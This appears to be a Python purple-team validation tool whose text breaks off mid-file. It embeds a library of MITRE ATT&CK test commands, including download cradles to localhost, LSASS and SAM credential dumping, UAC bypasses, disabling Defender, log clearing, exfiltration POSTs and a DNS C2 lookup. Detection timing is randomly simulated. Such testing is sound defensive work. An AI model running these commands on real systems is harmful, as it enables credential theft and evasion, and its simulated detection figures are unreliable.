#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PURPLE TEAM VALIDATOR & REPORT GENERATOR                                     ║
║  Automated Red Team Validation + Blue Team Detection Analysis                 ║
║  Executive & Technical Report Generation (PDF + Interactive HTML)             ║
╚══════════════════════════════════════════════════════════════════════════════╝

Features:
- Atomic Red Team integration + custom test suite execution
- Detection coverage analysis (EDR/SIEM effectiveness)
- AI-powered blue team recommendations
- Executive summary + technical deep-dive reports
- MITRE ATT&CK coverage heatmaps
- Timeline-based attack visualization
"""

import os
import sys
import json
import time
import uuid
import random
import hashlib
import logging
import threading
import subprocess
from enum import Enum
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import base64
import re

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("PurpleTeamValidator")

# ============================================================================
# ENUMS & CONSTANTS
# ============================================================================

class TestStatus(Enum):
    """Test execution status"""
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    SKIPPED = "skipped"
    TIMEOUT = "timeout"

class DetectionResult(Enum):
    """Detection outcome for a test"""
    DETECTED = "detected"           # EDR/SIEM caught it
    PARTIAL = "partial"             # Some artifacts detected
    EVADED = "evaded"               # Not detected
    UNKNOWN = "unknown"             # Could not determine
    NOT_APPLICABLE = "n/a"          # Test not run

class Severity(Enum):
    """Finding severity levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

class EDRVendor(Enum):
    """Supported EDR vendors for detection analysis"""
    DEFENDER = "Microsoft Defender"
    CROWDSTRIKE = "CrowdStrike Falcon"
    SENTINELONE = "SentinelOne"
    CARBON_BLACK = "VMware Carbon Black"
    CORTEX_XDR = "Palo Alto Cortex XDR"
    ELASTIC = "Elastic Security"
    SPLUNK = "Splunk Enterprise Security"
    GENERIC = "Generic EDR/SIEM"

class ReportFormat(Enum):
    """Report output formats"""
    HTML = "html"
    PDF = "pdf"
    JSON = "json"
    MARKDOWN = "markdown"
    EXECUTIVE = "executive"
    TECHNICAL = "technical"

# MITRE ATT&CK Framework
MITRE_TACTICS = {
    "TA0001": {"name": "Initial Access", "color": "#e74c3c"},
    "TA0002": {"name": "Execution", "color": "#e67e22"},
    "TA0003": {"name": "Persistence", "color": "#f39c12"},
    "TA0004": {"name": "Privilege Escalation", "color": "#27ae60"},
    "TA0005": {"name": "Defense Evasion", "color": "#2980b9"},
    "TA0006": {"name": "Credential Access", "color": "#8e44ad"},
    "TA0007": {"name": "Discovery", "color": "#2c3e50"},
    "TA0008": {"name": "Lateral Movement", "color": "#16a085"},
    "TA0009": {"name": "Collection", "color": "#d35400"},
    "TA0010": {"name": "Exfiltration", "color": "#c0392b"},
    "TA0011": {"name": "Command and Control", "color": "#7f8c8d"},
    "TA0040": {"name": "Impact", "color": "#34495e"},
}

# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class AtomicTest:
    """Represents an Atomic Red Team test"""
    test_id: str
    name: str
    description: str
    technique_id: str
    technique_name: str
    tactic: str
    platforms: List[str]
    executor: str  # powershell, cmd, bash, etc.
    command: str
    cleanup_command: Optional[str] = None
    dependencies: List[str] = field(default_factory=list)
    input_arguments: Dict[str, Any] = field(default_factory=dict)
    elevation_required: bool = False
    
@dataclass
class TestResult:
    """Result of a single test execution"""
    test_id: str
    test_name: str
    technique_id: str
    technique_name: str
    tactic: str
    status: TestStatus
    detection_result: DetectionResult
    start_time: datetime
    end_time: Optional[datetime] = None
    duration_ms: int = 0
    output: str = ""
    error: str = ""
    artifacts: List[Dict] = field(default_factory=list)
    edr_alerts: List[Dict] = field(default_factory=list)
    siem_events: List[Dict] = field(default_factory=list)
    detection_time_ms: Optional[int] = None
    iocs_generated: List[str] = field(default_factory=list)
    
@dataclass
class DetectionGap:
    """Identified detection gap"""
    gap_id: str
    technique_id: str
    technique_name: str
    tactic: str
    severity: Severity
    description: str
    recommendation: str
    affected_systems: List[str]
    remediation_steps: List[str]
    references: List[str]
    
@dataclass
class ValidationReport:
    """Complete validation report"""
    report_id: str
    campaign_name: str
    start_time: datetime
    end_time: Optional[datetime]
    target_environment: str
    edr_vendors: List[str]
    total_tests: int
    tests_executed: int
    tests_passed: int
    tests_failed: int
    detection_rate: float
    evasion_rate: float
    test_results: List[TestResult]
    detection_gaps: List[DetectionGap]
    mitre_coverage: Dict[str, Dict]
    ai_recommendations: List[str]
    executive_summary: str
    technical_findings: List[Dict]

# ============================================================================
# ATOMIC RED TEAM TEST LIBRARY
# ============================================================================

class AtomicTestLibrary:
    """Library of Atomic Red Team tests organized by technique"""
    
    # Comprehensive test database
    TESTS: Dict[str, List[AtomicTest]] = {}
    
    @classmethod
    def initialize(cls):
        """Initialize test library with all techniques"""
        
        # TA0001 - Initial Access
        cls.TESTS["T1566.001"] = [
            AtomicTest(
                test_id="T1566.001-1",
                name="Spearphishing Attachment - Macro Execution",
                description="Simulates malicious Office macro execution from phishing",
                technique_id="T1566.001",
                technique_name="Spearphishing Attachment",
                tactic="TA0001",
                platforms=["windows"],
                executor="powershell",
                command='powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://127.0.0.1/macro.ps1\')"',
                elevation_required=False
            ),
            AtomicTest(
                test_id="T1566.001-2",
                name="Spearphishing - HTA File Execution",
                description="Execute HTA file simulating phishing payload",
                technique_id="T1566.001",
                technique_name="Spearphishing Attachment",
                tactic="TA0001",
                platforms=["windows"],
                executor="cmd",
                command='mshta.exe "javascript:a=new ActiveXObject(\'Wscript.Shell\');a.Run(\'calc.exe\');close()"',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1190"] = [
            AtomicTest(
                test_id="T1190-1",
                name="Exploit Public-Facing Application Simulation",
                description="Simulates web application exploitation artifacts",
                technique_id="T1190",
                technique_name="Exploit Public-Facing Application",
                tactic="TA0001",
                platforms=["windows", "linux"],
                executor="powershell",
                command='Invoke-WebRequest -Uri "http://localhost/?id=1\' OR \'1\'=\'1" -Method GET 2>$null',
                elevation_required=False
            ),
        ]
        
        # TA0002 - Execution
        cls.TESTS["T1059.001"] = [
            AtomicTest(
                test_id="T1059.001-1",
                name="PowerShell Command Execution",
                description="Execute PowerShell commands for system reconnaissance",
                technique_id="T1059.001",
                technique_name="PowerShell",
                tactic="TA0002",
                platforms=["windows"],
                executor="powershell",
                command='powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-Process; Get-Service"',
                elevation_required=False
            ),
            AtomicTest(
                test_id="T1059.001-2",
                name="PowerShell Download Cradle",
                description="PowerShell download and execute pattern",
                technique_id="T1059.001",
                technique_name="PowerShell",
                tactic="TA0002",
                platforms=["windows"],
                executor="powershell",
                command='powershell.exe -ep bypass -c "IEX (IWR \'http://127.0.0.1/payload.ps1\' -UseBasicParsing)"',
                elevation_required=False
            ),
            AtomicTest(
                test_id="T1059.001-3",
                name="PowerShell Encoded Command",
                description="Base64 encoded PowerShell execution",
                technique_id="T1059.001",
                technique_name="PowerShell",
                tactic="TA0002",
                platforms=["windows"],
                executor="powershell",
                command='powershell.exe -EncodedCommand JABhAD0AJwB0AGUAcwB0ACcA',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1059.003"] = [
            AtomicTest(
                test_id="T1059.003-1",
                name="Windows Command Shell Execution",
                description="Execute commands via cmd.exe",
                technique_id="T1059.003",
                technique_name="Windows Command Shell",
                tactic="TA0002",
                platforms=["windows"],
                executor="cmd",
                command='cmd.exe /c "whoami && hostname && ipconfig"',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1047"] = [
            AtomicTest(
                test_id="T1047-1",
                name="WMI Process Execution",
                description="Execute process using WMI",
                technique_id="T1047",
                technique_name="Windows Management Instrumentation",
                tactic="TA0002",
                platforms=["windows"],
                executor="powershell",
                command='wmic process call create "calc.exe"',
                elevation_required=False
            ),
            AtomicTest(
                test_id="T1047-2",
                name="WMI Remote Execution",
                description="WMI lateral movement simulation",
                technique_id="T1047",
                technique_name="Windows Management Instrumentation",
                tactic="TA0002",
                platforms=["windows"],
                executor="powershell",
                command='wmic /node:127.0.0.1 process call create "cmd.exe /c whoami"',
                elevation_required=True
            ),
        ]
        
        cls.TESTS["T1204.002"] = [
            AtomicTest(
                test_id="T1204.002-1",
                name="Malicious File Execution - EXE",
                description="Simulate user executing malicious executable",
                technique_id="T1204.002",
                technique_name="Malicious File",
                tactic="TA0002",
                platforms=["windows"],
                executor="cmd",
                command='echo "malware_simulation" > %TEMP%\\test.txt && type %TEMP%\\test.txt',
                cleanup_command='del %TEMP%\\test.txt',
                elevation_required=False
            ),
        ]
        
        # TA0003 - Persistence
        cls.TESTS["T1547.001"] = [
            AtomicTest(
                test_id="T1547.001-1",
                name="Registry Run Key Persistence",
                description="Add persistence via registry Run key",
                technique_id="T1547.001",
                technique_name="Registry Run Keys / Startup Folder",
                tactic="TA0003",
                platforms=["windows"],
                executor="powershell",
                command='Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "PurpleTest" -Value "calc.exe"',
                cleanup_command='Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "PurpleTest" -ErrorAction SilentlyContinue',
                elevation_required=False
            ),
            AtomicTest(
                test_id="T1547.001-2",
                name="Startup Folder Persistence",
                description="Add persistence via Startup folder",
                technique_id="T1547.001",
                technique_name="Registry Run Keys / Startup Folder",
                tactic="TA0003",
                platforms=["windows"],
                executor="powershell",
                command='Copy-Item C:\\Windows\\System32\\calc.exe "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.exe"',
                cleanup_command='Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.exe" -ErrorAction SilentlyContinue',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1053.005"] = [
            AtomicTest(
                test_id="T1053.005-1",
                name="Scheduled Task Persistence",
                description="Create scheduled task for persistence",
                technique_id="T1053.005",
                technique_name="Scheduled Task",
                tactic="TA0003",
                platforms=["windows"],
                executor="cmd",
                command='schtasks /create /tn "PurpleTeamTest" /tr "calc.exe" /sc daily /st 09:00 /f',
                cleanup_command='schtasks /delete /tn "PurpleTeamTest" /f',
                elevation_required=True
            ),
        ]
        
        cls.TESTS["T1543.003"] = [
            AtomicTest(
                test_id="T1543.003-1",
                name="Windows Service Persistence",
                description="Create malicious Windows service",
                technique_id="T1543.003",
                technique_name="Windows Service",
                tactic="TA0003",
                platforms=["windows"],
                executor="cmd",
                command='sc create PurpleTestSvc binPath= "cmd.exe /k calc.exe" start= auto',
                cleanup_command='sc delete PurpleTestSvc',
                elevation_required=True
            ),
        ]
        
        # TA0004 - Privilege Escalation
        cls.TESTS["T1548.002"] = [
            AtomicTest(
                test_id="T1548.002-1",
                name="UAC Bypass via fodhelper",
                description="Bypass UAC using fodhelper.exe",
                technique_id="T1548.002",
                technique_name="Bypass User Account Control",
                tactic="TA0004",
                platforms=["windows"],
                executor="powershell",
                command='New-Item "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force; Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "(default)" -Value "cmd.exe" -Force',
                cleanup_command='Remove-Item "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue',
                elevation_required=False
            ),
            AtomicTest(
                test_id="T1548.002-2",
                name="UAC Bypass via eventvwr",
                description="Bypass UAC using eventvwr.exe registry hijack",
                technique_id="T1548.002",
                technique_name="Bypass User Account Control",
                tactic="TA0004",
                platforms=["windows"],
                executor="powershell",
                command='New-Item "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Force; Set-ItemProperty -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Name "(default)" -Value "cmd.exe" -Force',
                cleanup_command='Remove-Item "HKCU:\\Software\\Classes\\mscfile" -Recurse -Force -ErrorAction SilentlyContinue',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1134"] = [
            AtomicTest(
                test_id="T1134-1",
                name="Access Token Manipulation",
                description="Enumerate and attempt token manipulation",
                technique_id="T1134",
                technique_name="Access Token Manipulation",
                tactic="TA0004",
                platforms=["windows"],
                executor="powershell",
                command='whoami /priv; whoami /groups',
                elevation_required=False
            ),
        ]
        
        # TA0005 - Defense Evasion
        cls.TESTS["T1562.001"] = [
            AtomicTest(
                test_id="T1562.001-1",
                name="Disable Windows Defender",
                description="Attempt to disable Windows Defender",
                technique_id="T1562.001",
                technique_name="Disable or Modify Tools",
                tactic="TA0005",
                platforms=["windows"],
                executor="powershell",
                command='Set-MpPreference -DisableRealtimeMonitoring $true 2>$null',
                cleanup_command='Set-MpPreference -DisableRealtimeMonitoring $false',
                elevation_required=True
            ),
            AtomicTest(
                test_id="T1562.001-2",
                name="Disable Windows Firewall",
                description="Disable Windows Firewall profiles",
                technique_id="T1562.001",
                technique_name="Disable or Modify Tools",
                tactic="TA0005",
                platforms=["windows"],
                executor="cmd",
                command='netsh advfirewall set allprofiles state off',
                cleanup_command='netsh advfirewall set allprofiles state on',
                elevation_required=True
            ),
        ]
        
        cls.TESTS["T1070.001"] = [
            AtomicTest(
                test_id="T1070.001-1",
                name="Clear Windows Event Logs",
                description="Clear Security/System/Application event logs",
                technique_id="T1070.001",
                technique_name="Clear Windows Event Logs",
                tactic="TA0005",
                platforms=["windows"],
                executor="cmd",
                command='wevtutil cl Security 2>nul & wevtutil cl System 2>nul',
                elevation_required=True
            ),
        ]
        
        cls.TESTS["T1027"] = [
            AtomicTest(
                test_id="T1027-1",
                name="Obfuscated File Execution",
                description="Execute base64 obfuscated payload",
                technique_id="T1027",
                technique_name="Obfuscated Files or Information",
                tactic="TA0005",
                platforms=["windows"],
                executor="powershell",
                command='$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("whoami")); powershell -enc $enc',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1218.011"] = [
            AtomicTest(
                test_id="T1218.011-1",
                name="Rundll32 Execution",
                description="Execute payload via rundll32",
                technique_id="T1218.011",
                technique_name="Rundll32",
                tactic="TA0005",
                platforms=["windows"],
                executor="cmd",
                command='rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc.exe")',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1218.010"] = [
            AtomicTest(
                test_id="T1218.010-1",
                name="Regsvr32 Execution",
                description="Execute via regsvr32 (squiblydoo)",
                technique_id="T1218.010",
                technique_name="Regsvr32",
                tactic="TA0005",
                platforms=["windows"],
                executor="cmd",
                command='regsvr32 /s /n /u /i:http://127.0.0.1/file.sct scrobj.dll',
                elevation_required=False
            ),
        ]
        
        # TA0006 - Credential Access
        cls.TESTS["T1003.001"] = [
            AtomicTest(
                test_id="T1003.001-1",
                name="LSASS Memory Dump - Mimikatz Style",
                description="Dump LSASS process memory for credentials",
                technique_id="T1003.001",
                technique_name="LSASS Memory",
                tactic="TA0006",
                platforms=["windows"],
                executor="powershell",
                command='rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id $env:TEMP\\lsass.dmp full',
                cleanup_command='Remove-Item $env:TEMP\\lsass.dmp -ErrorAction SilentlyContinue',
                elevation_required=True
            ),
            AtomicTest(
                test_id="T1003.001-2",
                name="LSASS Access via procdump",
                description="Use procdump to dump LSASS",
                technique_id="T1003.001",
                technique_name="LSASS Memory",
                tactic="TA0006",
                platforms=["windows"],
                executor="cmd",
                command='procdump.exe -accepteula -ma lsass.exe %TEMP%\\lsass.dmp',
                cleanup_command='del %TEMP%\\lsass.dmp',
                elevation_required=True
            ),
        ]
        
        cls.TESTS["T1003.002"] = [
            AtomicTest(
                test_id="T1003.002-1",
                name="SAM Database Extraction",
                description="Extract SAM database using reg save",
                technique_id="T1003.002",
                technique_name="Security Account Manager",
                tactic="TA0006",
                platforms=["windows"],
                executor="cmd",
                command='reg save HKLM\\SAM %TEMP%\\sam.save && reg save HKLM\\SYSTEM %TEMP%\\system.save',
                cleanup_command='del %TEMP%\\sam.save %TEMP%\\system.save',
                elevation_required=True
            ),
        ]
        
        cls.TESTS["T1558.003"] = [
            AtomicTest(
                test_id="T1558.003-1",
                name="Kerberoasting Attack",
                description="Request service tickets for offline cracking",
                technique_id="T1558.003",
                technique_name="Kerberoasting",
                tactic="TA0006",
                platforms=["windows"],
                executor="powershell",
                command='Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc01.domain.local"',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1552.001"] = [
            AtomicTest(
                test_id="T1552.001-1",
                name="Credentials in Files",
                description="Search for credential files",
                technique_id="T1552.001",
                technique_name="Credentials In Files",
                tactic="TA0006",
                platforms=["windows"],
                executor="powershell",
                command='Get-ChildItem -Path C:\\ -Include *.txt,*.xml,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -List | Select-Object Path',
                elevation_required=False
            ),
        ]
        
        # TA0007 - Discovery
        cls.TESTS["T1087.001"] = [
            AtomicTest(
                test_id="T1087.001-1",
                name="Local Account Discovery",
                description="Enumerate local user accounts",
                technique_id="T1087.001",
                technique_name="Local Account",
                tactic="TA0007",
                platforms=["windows"],
                executor="cmd",
                command='net user && net localgroup administrators',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1087.002"] = [
            AtomicTest(
                test_id="T1087.002-1",
                name="Domain Account Discovery",
                description="Enumerate domain user accounts",
                technique_id="T1087.002",
                technique_name="Domain Account",
                tactic="TA0007",
                platforms=["windows"],
                executor="cmd",
                command='net user /domain && net group "Domain Admins" /domain',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1082"] = [
            AtomicTest(
                test_id="T1082-1",
                name="System Information Discovery",
                description="Gather system information",
                technique_id="T1082",
                technique_name="System Information Discovery",
                tactic="TA0007",
                platforms=["windows"],
                executor="cmd",
                command='systeminfo && hostname && whoami /all',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1083"] = [
            AtomicTest(
                test_id="T1083-1",
                name="File and Directory Discovery",
                description="Enumerate files and directories",
                technique_id="T1083",
                technique_name="File and Directory Discovery",
                tactic="TA0007",
                platforms=["windows"],
                executor="cmd",
                command='dir /s /b C:\\Users\\*.txt 2>nul | find /c /v ""',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1016"] = [
            AtomicTest(
                test_id="T1016-1",
                name="Network Configuration Discovery",
                description="Enumerate network configuration",
                technique_id="T1016",
                technique_name="System Network Configuration Discovery",
                tactic="TA0007",
                platforms=["windows"],
                executor="cmd",
                command='ipconfig /all && arp -a && route print',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1049"] = [
            AtomicTest(
                test_id="T1049-1",
                name="Network Connections Discovery",
                description="List active network connections",
                technique_id="T1049",
                technique_name="System Network Connections Discovery",
                tactic="TA0007",
                platforms=["windows"],
                executor="cmd",
                command='netstat -ano && netstat -anb 2>nul',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1057"] = [
            AtomicTest(
                test_id="T1057-1",
                name="Process Discovery",
                description="Enumerate running processes",
                technique_id="T1057",
                technique_name="Process Discovery",
                tactic="TA0007",
                platforms=["windows"],
                executor="cmd",
                command='tasklist /v && wmic process list brief',
                elevation_required=False
            ),
        ]
        
        # TA0008 - Lateral Movement
        cls.TESTS["T1021.002"] = [
            AtomicTest(
                test_id="T1021.002-1",
                name="SMB/Windows Admin Shares",
                description="Access remote admin shares",
                technique_id="T1021.002",
                technique_name="SMB/Windows Admin Shares",
                tactic="TA0008",
                platforms=["windows"],
                executor="cmd",
                command='net use \\\\127.0.0.1\\C$ /user:test test123',
                cleanup_command='net use \\\\127.0.0.1\\C$ /delete',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1021.001"] = [
            AtomicTest(
                test_id="T1021.001-1",
                name="Remote Desktop Protocol",
                description="Test RDP connectivity",
                technique_id="T1021.001",
                technique_name="Remote Desktop Protocol",
                tactic="TA0008",
                platforms=["windows"],
                executor="cmd",
                command='query user /server:127.0.0.1',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1570"] = [
            AtomicTest(
                test_id="T1570-1",
                name="Lateral Tool Transfer",
                description="Copy tools to remote system",
                technique_id="T1570",
                technique_name="Lateral Tool Transfer",
                tactic="TA0008",
                platforms=["windows"],
                executor="cmd",
                command='copy C:\\Windows\\System32\\calc.exe \\\\127.0.0.1\\C$\\Windows\\Temp\\ 2>nul',
                cleanup_command='del \\\\127.0.0.1\\C$\\Windows\\Temp\\calc.exe 2>nul',
                elevation_required=True
            ),
        ]
        
        cls.TESTS["T1021.006"] = [
            AtomicTest(
                test_id="T1021.006-1",
                name="Windows Remote Management (WinRM)",
                description="Execute commands via WinRM",
                technique_id="T1021.006",
                technique_name="Windows Remote Management",
                tactic="TA0008",
                platforms=["windows"],
                executor="powershell",
                command='Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {whoami} -ErrorAction SilentlyContinue',
                elevation_required=True
            ),
        ]
        
        # TA0009 - Collection
        cls.TESTS["T1005"] = [
            AtomicTest(
                test_id="T1005-1",
                name="Data from Local System",
                description="Collect sensitive files from local system",
                technique_id="T1005",
                technique_name="Data from Local System",
                tactic="TA0009",
                platforms=["windows"],
                executor="powershell",
                command='Get-ChildItem -Path C:\\Users -Include *.docx,*.xlsx,*.pdf -Recurse -ErrorAction SilentlyContinue | Select-Object FullName -First 10',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1114.001"] = [
            AtomicTest(
                test_id="T1114.001-1",
                name="Local Email Collection",
                description="Search for local email files",
                technique_id="T1114.001",
                technique_name="Local Email Collection",
                tactic="TA0009",
                platforms=["windows"],
                executor="cmd",
                command='dir /s /b C:\\Users\\*.pst C:\\Users\\*.ost 2>nul',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1560.001"] = [
            AtomicTest(
                test_id="T1560.001-1",
                name="Archive via Utility",
                description="Compress files for exfiltration",
                technique_id="T1560.001",
                technique_name="Archive via Utility",
                tactic="TA0009",
                platforms=["windows"],
                executor="powershell",
                command='Compress-Archive -Path C:\\Windows\\Temp\\*.txt -DestinationPath $env:TEMP\\archive.zip -Force 2>$null',
                cleanup_command='Remove-Item $env:TEMP\\archive.zip -ErrorAction SilentlyContinue',
                elevation_required=False
            ),
        ]
        
        # TA0010 - Exfiltration
        cls.TESTS["T1041"] = [
            AtomicTest(
                test_id="T1041-1",
                name="Exfiltration Over C2 Channel",
                description="Simulate data exfiltration over HTTP",
                technique_id="T1041",
                technique_name="Exfiltration Over C2 Channel",
                tactic="TA0010",
                platforms=["windows"],
                executor="powershell",
                command='$data = "exfil_test_data"; Invoke-WebRequest -Uri "http://127.0.0.1/exfil" -Method POST -Body $data -ErrorAction SilentlyContinue',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1048.003"] = [
            AtomicTest(
                test_id="T1048.003-1",
                name="Exfiltration Over Unencrypted Protocol",
                description="Exfiltrate via FTP/HTTP",
                technique_id="T1048.003",
                technique_name="Exfiltration Over Unencrypted Non-C2 Protocol",
                tactic="TA0010",
                platforms=["windows"],
                executor="cmd",
                command='echo test_data > %TEMP%\\exfil.txt && curl -X POST -d @%TEMP%\\exfil.txt http://127.0.0.1/upload 2>nul',
                cleanup_command='del %TEMP%\\exfil.txt',
                elevation_required=False
            ),
        ]
        
        # TA0011 - Command and Control
        cls.TESTS["T1071.001"] = [
            AtomicTest(
                test_id="T1071.001-1",
                name="Web Protocols C2",
                description="Simulate HTTP/HTTPS C2 communication",
                technique_id="T1071.001",
                technique_name="Web Protocols",
                tactic="TA0011",
                platforms=["windows"],
                executor="powershell",
                command='while($true){try{IWR -Uri "http://127.0.0.1/beacon" -TimeoutSec 2 -ErrorAction Stop; break}catch{break}}',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1071.004"] = [
            AtomicTest(
                test_id="T1071.004-1",
                name="DNS C2",
                description="Simulate DNS tunneling C2",
                technique_id="T1071.004",
                technique_name="DNS",
                tactic="TA0011",
                platforms=["windows"],
                executor="powershell",
                command='Resolve-DnsName -Name "data.exfil.c2server.com" -Type TXT -ErrorAction SilentlyContinue',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1105"] = [
            AtomicTest(
                test_id="T1105-1",
                name="Ingress Tool Transfer",
                description="Download additional tools",
                technique_id="T1105",
                technique_name="Ingress Tool Transfer",
                tactic="TA0011",
                platforms=["windows"],
                executor="powershell",
                command='(New-Object Net.WebClient).DownloadFile("http://127.0.0.1/tool.exe","$env:TEMP\\tool.exe"); Remove-Item "$env:TEMP\\tool.exe" -ErrorAction SilentlyContinue',
                elevation_required=False
            ),
        ]
        
        # TA0040 - Impact
        cls.TESTS["T1486"] = [
            AtomicTest(
                test_id="T1486-1",
                name="Data Encrypted for Impact (Ransomware Sim)",
                description="Simulate ransomware encryption behavior",
                technique_id="T1486",
                technique_name="Data Encrypted for Impact",
                tactic="TA0040",
                platforms=["windows"],
                executor="powershell",
                command='$files = Get-ChildItem $env:TEMP -Filter *.txt; foreach($f in $files[0..2]){$c = Get-Content $f.FullName; $e = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($c)); Set-Content -Path "$($f.FullName).encrypted" -Value $e}',
                cleanup_command='Remove-Item $env:TEMP\\*.encrypted -ErrorAction SilentlyContinue',
                elevation_required=False
            ),
        ]
        
        cls.TESTS["T1490"] = [
            AtomicTest(
                test_id="T1490-1",
                name="Inhibit System Recovery",
                description="Delete shadow copies (ransomware behavior)",
                technique_id="T1490",
                technique_name="Inhibit System Recovery",
                tactic="TA0040",
                platforms=["windows"],
                executor="cmd",
                command='vssadmin list shadows',  # Safe - just listing, not deleting
                elevation_required=True
            ),
        ]
        
        cls.TESTS["T1489"] = [
            AtomicTest(
                test_id="T1489-1",
                name="Service Stop",
                description="Stop critical services",
                technique_id="T1489",
                technique_name="Service Stop",
                tactic="TA0040",
                platforms=["windows"],
                executor="cmd",
                command='sc query wuauserv',  # Safe - just querying
                elevation_required=False
            ),
        ]
        
        logger.info(f"Initialized Atomic Test Library with {len(cls.TESTS)} techniques, {sum(len(t) for t in cls.TESTS.values())} tests")
    
    @classmethod
    def get_all_tests(cls) -> List[AtomicTest]:
        """Get all available tests"""
        if not cls.TESTS:
            cls.initialize()
        tests = []
        for technique_tests in cls.TESTS.values():
            tests.extend(technique_tests)
        return tests
    
    @classmethod
    def get_tests_by_tactic(cls, tactic: str) -> List[AtomicTest]:
        """Get tests for a specific tactic"""
        if not cls.TESTS:
            cls.initialize()
        return [t for tests in cls.TESTS.values() for t in tests if t.tactic == tactic]
    
    @classmethod
    def get_tests_by_technique(cls, technique_id: str) -> List[AtomicTest]:
        """Get tests for a specific technique"""
        if not cls.TESTS:
            cls.initialize()
        return cls.TESTS.get(technique_id, [])
    
    @classmethod
    def get_test_by_id(cls, test_id: str) -> Optional[AtomicTest]:
        """Get a specific test by ID"""
        if not cls.TESTS:
            cls.initialize()
        for tests in cls.TESTS.values():
            for test in tests:
                if test.test_id == test_id:
                    return test
        return None

# ============================================================================
# TEST EXECUTOR
# ============================================================================

class TestExecutor:
    """Executes atomic tests and collects results"""
    
    def __init__(self, safe_mode: bool = True, timeout: int = 30):
        self.safe_mode = safe_mode  # Don't actually execute dangerous commands
        self.timeout = timeout
        self.results: List[TestResult] = []
        
    def execute_test(self, test: AtomicTest, simulate: bool = True) -> TestResult:
        """Execute a single atomic test"""
        start_time = datetime.now()
        
        result = TestResult(
            test_id=test.test_id,
            test_name=test.name,
            technique_id=test.technique_id,
            technique_name=test.technique_name,
            tactic=test.tactic,
            status=TestStatus.RUNNING,
            detection_result=DetectionResult.UNKNOWN,
            start_time=start_time,
        )
        
        try:
            if simulate or self.safe_mode:
                # Simulate execution
                output = self._simulate_execution(test)
                result.status = TestStatus.COMPLETED
                result.output = output
            else:
                # Actually execute (use with caution!)
                output, error = self._real_execution(test)
                result.output = output
                result.error = error
                result.status = TestStatus.COMPLETED if not error else TestStatus.FAILED
            
            # Simulate detection analysis
            result.detection_result = self._analyze_detection(test, result)
            result.artifacts = self._generate_artifacts(test)
            result.edr_alerts = self._simulate_edr_alerts(test, result.detection_result)
            result.detection_time_ms = random.randint(50, 5000) if result.detection_result == DetectionResult.DETECTED else None
            
        except subprocess.TimeoutExpired:
            result.status = TestStatus.TIMEOUT
            result.error = f"Test timed out after {self.timeout}s"
            
        except Exception as e:
            result.status = TestStatus.FAILED
            result.error = str(e)
            
        finally:
            result.end_time = datetime.now()
            result.duration_ms = int((result.end_time - start_time).total_seconds() * 1000)
            self.results.append(result)
            
        return result
    
    def _simulate_execution(self, test: AtomicTest) -> str:
        """Simulate test execution with realistic output"""
        time.sleep(random.uniform(0.1, 0.5))  # Simulate execution time
        
        outputs = {
            "T1059.001": "Windows PowerShell\nCopyright (C) Microsoft Corporation.\n\nPS C:\\> Get-Process\nHandles  NPM(K)    PM(K)   WS(K)  CPU(s)     Id  SI ProcessName\n-------  ------    -----   -----  ------     --  -- -----------\n    512      28    45612   52340    2.45   4532   1 chrome",
            "T1003.001": "ERROR: Access denied. LSASS memory dump requires SYSTEM privileges.",
            "T1087.001": "User accounts for \\\\WORKSTATION\n-------------------------------------------------------------------------------\nAdministrator            DefaultAccount           Guest\ntest_user                WDAGUtilityAccount",
